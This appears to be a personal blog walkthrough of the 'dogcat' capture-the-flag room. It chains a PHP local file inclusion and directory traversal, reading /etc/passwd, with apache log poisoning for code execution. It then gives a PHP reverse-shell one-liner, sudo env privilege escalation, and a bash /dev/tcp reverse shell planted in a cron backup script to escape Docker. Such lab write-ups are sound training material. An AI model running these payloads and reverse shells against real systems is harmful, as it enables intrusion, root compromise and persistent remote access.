---
title: dogcat
draft: false
date:
subiect:
dificultate: 4
amuca: true
link:
tags:
  - cyberStuff
lastmod: 2026-02-24T13:20:51.591Z
---
scaning :\
nothing interesting just ssh and http

accesing the website we see thi s, ok cool\
![](/images/blog-ul-meu/static/Pasted%20image%2020260224063123.png)\
if we press dog for example apicture of a dog will be shown, ok cool , but look at the url, i think this site is vulanrable to a directory traversal\
![](/images/blog-ul-meu/static/Pasted%20image%2020260224063139.png)\
ok cool it is , now its time to craft the payload\
![](/images/blog-ul-meu/static/Pasted%20image%2020260224063107.png)\
ok interesting lets also look inside the source code\
![](/images/blog-ul-meu/static/Pasted%20image%2020260224064157.png)\
ok cool  lets use something from https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion

and we found this

```
php://filter/convert.base64-encode/resource=index.php
```

we just have to append this to our current url\
modified to out needs it will be :

```
php://filter/convert.base64-encode/resource=./cat../../index
```

and we get this\
![](/images/blog-ul-meu/static/Pasted%20image%2020260224064949.png)decoding that will get the code of our page

```
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

ok cool based on that html code we see that we have to declare our extrnasion for the directory traveersal to work  in the ext var\
![](/images/blog-ul-meu/static/Pasted%20image%2020260224065538.png)\
and we just like that with the payload

```
http://10.114.188.64/?view=./dog../../../../../../../../../../etc/passwd&ext=
```

passwd file

```
sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

ok cool , lets try a log poisoning attack\
log poisoning attack is attack where we introduce some malicios code into a log file , then when we open the log file with directory traversal the code will be executed

we gonna use this from payload all the things\
![](/images/blog-ul-meu/static/Pasted%20image%2020260224070913.png)\
more exactly

```
http://example.com/index.php?page=/var/log/apache/access.log
```

but we goona have to use for apache2\
![](/images/blog-ul-meu/static/Pasted%20image%2020260224071105.png)\
ok cool pretty messy but cool

```
view=./dog../../../../../../../../../../var/log/apache2/access.log&ext=
```

the payload in case u need it

lets send it to burpsuite

```
	to send it with no foxy rpoxy we can just go to firefox settings , search proxy and modify the proxy as bellow 
```

![](/images/blog-ul-meu/static/Pasted%20image%2020260224071333.png)

set the interceptor on in the proxy section and we got hte request\
![](/images/blog-ul-meu/static/Pasted%20image%2020260224071425.png)\
tight click on it and send it to the repeater\
![](/images/blog-ul-meu/static/Pasted%20image%2020260224071628.png)\
and now we see this more pretty text , cool

looking more closely this is what we are going to exploit\
![](/images/blog-ul-meu/static/Pasted%20image%2020260224072926.png)\
using a custom get parameter\
i modified the request as following\
![](/images/blog-ul-meu/static/Pasted%20image%2020260224073442.png)\
and get the following :

![](/images/blog-ul-meu/static/Pasted%20image%2020260224073420.png)cool we can see that we are www-data

so now that we have remote code execution we can get a reverse shell , we know that the system has php installed so i tried the following line

```bash
php -r '$sock=fsockopen("YOUr_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

just replace the cmd with that then select the cmd value , press CONVERT SELEECTION -> URL -> URL ENCODE

also start nc on ehat port u want logic\
and bam we have a reverse shell\
![](/images/blog-ul-meu/static/Pasted%20image%2020260224075037.png)\
cool lets look around ,\
![](/images/blog-ul-meu/static/Pasted%20image%2020260224075329.png)\
and we found the first flag\
i pugradeed the shell with

```sh
SHELL=/bin/bash script -q /dev/null
```

![](/images/blog-ul-meu/static/Pasted%20image%2020260224075510.png)\
ok cool now lets try to priv esc\
![](/images/blog-ul-meu/static/Pasted%20image%2020260224075930.png)\
and boom easy , what i ded here was , run `sudo -l ` to see that we can run as root\
we found we can run env as root , so i search on gtfobins and found that env /bin/sh -p gives me root acces , and boom now lets just find the flags\
founded flag2\
![](/images/blog-ul-meu/static/Pasted%20image%2020260224080546.png)

but if we are already root and cand find flag 4 where can it be? that may mean we are in a docker container lets check it using

```
cat /proc/1/cgroup 
```

![](/images/blog-ul-meu/static/Pasted%20image%2020260224080740.png)\
and we are , cool

ok lets look inside the opt\
![](/images/blog-ul-meu/static/Pasted%20image%2020260224081750.png)\
cool and we can find a backup.sh script , leets modify it with yet another reverse shell

i pasther intro backup.sh this

```
#!/bin/bash
bash -i >& /dev/tcp/192.168.146.225/53  0>&1
```

try  to put using two cats may be easier\
start a nc to listen on our machine and in a short time we get another shell and boom, the 4th flag is here\
![](/images/blog-ul-meu/static/Pasted%20image%2020260224081640.png)\
very cool room
